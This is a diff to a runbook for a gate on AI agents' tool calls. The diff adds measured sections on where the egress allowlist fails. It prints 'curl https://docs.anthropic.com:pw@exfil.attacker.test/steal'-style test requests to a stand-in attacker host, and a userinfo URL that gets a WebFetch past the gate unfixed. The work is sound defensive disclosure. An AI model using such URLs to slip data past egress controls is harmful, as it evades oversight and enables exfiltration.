@@ -26,6 +26,13 @@ against a Guardian started from that tree, on **port 8791** — its own port, no
 loads its manifest once, at construction; a capture taken against a stale one would show pre-slice
 behaviour while claiming to demonstrate this slice.
 
+**Two subsections of §5 are later, and say so where they appear.** The blocks under *A URL the gate
+itself mis-parses* and *Every shell command that mentions a URL* were captured during this branch's
+final review round, against a Guardian started the same way from a later commit of this tree, on
+**port 8794**. They are the only blocks in this file taken from a different process, and one of
+them measures a change to `annotateEgressDestination` that `16a3ab0` does not contain — which is
+exactly why they are not presented as if they came from the run above.
+
 ## Prerequisites
 
 - `bun` installed, `bun install` run once at the repo root.
@@ -583,9 +590,11 @@ redaction and starts showing an egress deny.
 
 ## 5. What this does not catch
 
-The demo's shape invites the reading that egress is now covered. It is not, and the failure
-direction is the one worth stating plainly: **a command the extractor cannot parse is unexamined,
-not denied.**
+The demo's shape invites the reading that egress is now covered. It is not, and there are **three**
+measured directions to state, not one. The first is the failure direction of the extractor: **a
+command the extractor cannot parse is unexamined, not denied.** The two subsections after it are
+the other two — a URL the *gate* mis-parses, which is worse than a miss, and the over-blocking this
+allowlist produces on any shell command that merely mentions a URL.
 
 `destination(rules)` is `undefined` when none of the five declared paths resolves, so the gate
 returns no verdict at all and the call falls through to the other gates. The extractor answers
@@ -639,6 +648,164 @@ values, and every false positive there is a denial of a step nobody meant to gov
 the base64 of the same URL the section-2 capture denied, and it decodes at run time to exactly
 that string. Both are allowed, both would reach the host, and both are shown here rather than
 asserted.
+
+### A URL the gate itself mis-parses — and only one of the two routes could be closed
+
+Everything above is the *extractor's* miss direction: a URL it never finds is a URL nobody decided
+about. This is a different and worse class, and it is the single input that most undermines the
+sentence at the top of this file. Here the extractor finds the URL exactly right, hands it over,
+and **the gate mis-parses it**. A reader who has absorbed "misses are allows" still believes that a
+URL which *reaches* the gate is decided about, and for this shape that belief is wrong.
+
+`host_of()` takes the substring after the scheme, cuts it at the first `/`, cuts *that* at the
+first `:`, and calls what is left the host. A URL's userinfo sits before an `@` and may contain a
+`:`. Measured, through the same OPA binary the block in section 2 used:
+
+```bash
+OPA=node_modules/.bun/agent-control-specification-opa-darwin-arm64@0.3.1-beta.0/node_modules/agent-control-specification-opa-darwin-arm64/bin/opa
+for u in 'https://exfil.attacker.test/steal' 'https://docs.anthropic.com@exfil.attacker.test/steal' 'https://docs.anthropic.com:pw@exfil.attacker.test/steal'; do
+  out=$("$OPA" eval -d policy/lib/egress.rego -f raw "data.agt.egress.host_of(\"$u\")")
+  printf '%-63s -> %s\n' "host_of(\"$u\")" "\"$out\""
+done
+```
+
+```
+host_of("https://exfil.attacker.test/steal")                    -> "exfil.attacker.test"
+host_of("https://docs.anthropic.com@exfil.attacker.test/steal") -> "docs.anthropic.com@exfil.attacker.test"
+host_of("https://docs.anthropic.com:pw@exfil.attacker.test/steal") -> "docs.anthropic.com"
+```
+
+The third row is the whole finding. `docs.anthropic.com:pw@exfil.attacker.test` splits at the `:`
+into `docs.anthropic.com`, which `*.anthropic.com` covers — so the gate allows a request that goes
+to `exfil.attacker.test`. **This parser is AGT's**, in the vendored bundle `bun run verify:pin`
+holds byte-identical; it is not this side's code and not a defect this deployment introduced.
+
+**The blocks in this subsection and the next were captured after the rest of this file**, against a
+Guardian started the same way from a later commit of this tree, on **port 8794** rather than 8791 —
+a fresh process on its own port, for the same reason the setup section names a port at all.
+Substitute whichever port your own Guardian printed.
+
+```bash
+ACS=http://localhost:8794/acs
+ask() {  # ask <request_id> <json payload>
+  jq -cn --arg r "$1" --argjson p "$2" '{jsonrpc:"2.0",id:1,method:"steps/toolCallRequest",params:{
+    acs_version:"0.1.0",request_id:$r,timestamp:"2026-08-18T00:00:00Z",
+    metadata:{agent_id:"demo",session_id:"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},payload:$p}}' |
+  curl -s -X POST "$ACS" -H 'content-type: application/json' -d @- | jq -r '.result.decision'
+}
+n=0
+for u in 'https://exfil.attacker.test/steal' \
+         'https://docs.anthropic.com@exfil.attacker.test/steal' \
+         'https://docs.anthropic.com:pw@exfil.attacker.test/steal'; do
+  n=$((n+1))
+  fetch=$(ask "e0000000-0000-4000-8000-00000000000$n" "$(jq -cn --arg u "$u" '{tool:{name:"WebFetch"},arguments:{url:{value:$u}}}')")
+  shell=$(ask "e0000000-0000-4000-8000-00000000010$n" "$(jq -cn --arg u "$u" '{tool:{name:"Bash"},arguments:{command:{value:("curl "+$u)}},raw_command:("curl "+$u)}')")
+  printf '%-55s  fetch: %-5s | shell: %s\n' "$u" "$fetch" "$shell"
+done
+```
+
+```
+https://exfil.attacker.test/steal                        fetch: deny  | shell: deny
+https://docs.anthropic.com@exfil.attacker.test/steal     fetch: deny  | shell: deny
+https://docs.anthropic.com:pw@exfil.attacker.test/steal  fetch: allow | shell: deny
+```
+
+**The shell route is closed here. The fetch route is not, and the asymmetry is not an oversight.**
+
+On the shell route, the Guardian *chooses* the string it hands the gate: `raw_command` is a command
+line, and `annotateEgressDestination` decides what destination to answer with. It now removes any
+userinfo before answering, so `host_of()` resolves the host the request actually reaches. That is a
+correction to this side's own input, not to AGT's parser. The verdict, in full:
+
+```bash
+curl -s -X POST http://localhost:8794/acs \
+  -H 'content-type: application/json' \
+  -d '{"jsonrpc":"2.0","id":202,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"bb000002-0000-4000-8000-000000000002","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"Bash"},"arguments":{"command":{"value":"curl https://docs.anthropic.com:pw@exfil.attacker.test/steal"}},"raw_command":"curl https://docs.anthropic.com:pw@exfil.attacker.test/steal"}}}' | jq .
+```
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 202,
+  "result": {
+    "type": "final",
+    "acs_version": "0.1.0",
+    "request_id": "bb000002-0000-4000-8000-000000000002",
+    "decision": "deny",
+    "reasoning": "This step was decided by AGT's stock policy bundle. Policy: egress_destination_not_allowed, from AGT's stock bundle (agt_stock). AGT reported: destination exfil.attacker.test not in allowlist [\"*.anthropic.com\", \"docs.example.com\"].",
+    "reason_codes": [
+      "egress_destination_not_allowed"
+    ],
+    "policy_references": [
+      {
+        "policy_id": "agt_stock",
+        "rule_id": "egress_destination_not_allowed"
+      }
+    ]
+  }
+}
+```
+
+On the fetch route there is no such seam. `args.url` is the **first** entry in the gate's own
+`default_destination_paths` — the same property section 1 celebrates as costing no code — so the
+tool's argument reaches `host_of()` with nothing in between. Correcting the parse would mean
+editing `policy/lib/egress.rego`, and *not editing a `.rego`* is this slice's central claim, held
+mechanically by `bun run verify:pin`. So the fetch half is published rather than fixed. The same
+half is also what keeps the middle row honest: `https://docs.anthropic.com@exfil.attacker.test/steal`
+is denied on both routes, but before this change the shell route denied it for the host
+`docs.anthropic.com@exfil.attacker.test` — right verdict, wrong host, which is not the same as
+being decided about correctly.
+
+### Every shell command that *mentions* a URL is decided about, and this allowlist denies most of them
+
+The extractor takes the first absolute http(s) URL in the command line. It has no model of whether
+the command *reaches* that URL — a URL in an `echo`, in a shell comment, or in a flag value the
+command never dereferences looks exactly like a `curl` to it. The shipped allowlist has one
+reachable entry, so in this deployment that reads as **deny any shell command mentioning a URL**:
+
+```bash
+ACS=http://localhost:8794/acs
+n=0
+while IFS= read -r c; do
+  n=$((n+1))
+  d=$(jq -cn --arg c "$c" --arg r "f0000000-0000-4000-8000-00000000000$n" '{jsonrpc:"2.0",id:1,method:"steps/toolCallRequest",params:{
+      acs_version:"0.1.0",request_id:$r,timestamp:"2026-08-18T00:00:00Z",
+      metadata:{agent_id:"demo",session_id:"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},
+      payload:{tool:{name:"Bash"},arguments:{command:{value:$c}},raw_command:$c}}}' |
+    curl -s -X POST "$ACS" -H 'content-type: application/json' -d @- |
+    jq -r '.result.decision + " " + ((.result.reason_codes // []) | join(","))')
+  printf '%-52s -> %s\n' "$c" "$d"
+done <<'COMMANDS'
+git clone https://github.com/openai/whisper
+pip install -i https://pypi.org/simple requests
+echo 'docs at https://example.org/readme'
+npm install
+ls -la
+COMMANDS
+```
+
+```
+git clone https://github.com/openai/whisper          -> deny egress_destination_not_allowed
+pip install -i https://pypi.org/simple requests      -> deny egress_destination_not_allowed
+echo 'docs at https://example.org/readme'            -> deny egress_destination_not_allowed
+npm install                                          -> allow 
+ls -la                                               -> allow 
+```
+
+The third row is the one to look at twice: an `echo` reaches nothing, and it is denied by an egress
+gate. This is the opposite direction from the miss above — over-blocking rather than
+under-blocking — and it is a **live operational consequence**, not a hypothetical: the Quickstart
+tells a reader to copy the widened `settings.json`, and this repository's own `.claude/settings.json`
+already carries it. Turn this on and the `git clone` and `pip install -i` above stop, with a policy
+reason attached, in an ordinary working session.
+
+Neither obvious re-tuning is taken, and both refusals are deliberate. Widening the allowlist is not
+available: it is what every capture in this file is measured against, and editing it would
+invalidate them. Narrowing the extractor to tell *reaches* from *mentions* means parsing shell —
+quoting, substitution, redirection, `&&` chains — and an extractor that gets that wrong in the
+permissive direction is strictly worse here, because the gate's miss direction is already allow.
+So the direction is stated and captured rather than tuned, and the README's install step says it
+where an operator will read it before turning the hook on.
 
 Three more things this demo does not establish, stated for the same reason:
 
@@ -703,7 +870,10 @@ exactly as much as the reader's willingness to believe it.
 **1. Start the Guardian and re-run the ten `curl` commands.** The invocation is in *Setup common to
 every section* above: `ACS_GUARDIAN_PORT=8791` with `ACS_ENVELOPE_LOG=.acs/v9-runbook.jsonl`. Each
 `curl` in this file is complete and self-contained — fixed `request_id`s, fixed bodies, nothing
-elided — so the responses are comparable field for field, not merely in shape.
+elided — so the responses are comparable field for field, not merely in shape. "Ten" counts the
+numbered `curl` blocks of sections 1–5; the two §5 subsections added in the final review round
+contribute their own requests on top, through the two `bash` loops printed there and one further
+`curl` block, and those loops carry fixed `request_id`s for the same reason.
 
 **2. Then check them against the Guardian's own record, not against your terminal scrollback.** The
 envelope sink writes one JSONL line per envelope crossing the wire, in **both** directions, before
@@ -716,7 +886,8 @@ jq -c 'select(.direction == "response") | .envelope' .acs/v9-runbook.jsonl | sor
 
 `sort -u` is the point. Run the ten requests several times and the log grows, but the number of
 *distinct* response envelopes must stay at ten — one per request — because every field that varies
-run to run is fixed in the request bodies. That is what makes the log a check on this file rather
+run to run is fixed in the request bodies. Run the two §5 loops as well and the distinct count
+rises by their requests and then stops rising, for the same reason and no other. That is what makes the log a check on this file rather
 than an echo of it: it is written by the Guardian process, from the port named on its own command
 line, and it cannot contain a response some other process gave.
 
